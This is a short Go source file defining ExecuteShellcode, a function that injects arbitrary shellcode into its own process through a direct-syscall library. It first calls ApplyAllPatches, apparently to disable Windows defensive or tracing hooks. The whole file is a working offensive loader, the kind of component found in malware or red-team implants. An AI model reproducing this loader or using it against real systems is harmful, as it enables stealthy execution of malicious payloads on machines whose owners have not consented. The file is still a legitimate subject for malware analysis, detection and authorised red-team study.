package runshellthread

import (
	"fmt"

	"github.com/carved4/go-direct-syscall"
)

func ExecuteShellcode(shellcode []byte) (uintptr, error) {
	winapi.ApplyAllPatches()
	
	// NtInjectSelfShellcode handles the injection internally and returns only an error
	err := winapi.NtInjectSelfShellcode(shellcode)
	if err != nil {
		return 0, fmt.Errorf("error injecting shellcode: %w", err)
	}
	
	// Since NtInjectSelfShellcode doesn't return a thread handle,
	// we return a non-zero value to indicate success
	// The actual thread is managed internally by the winapi function
	return 1, nil // Return 1 to indicate successful injection
}	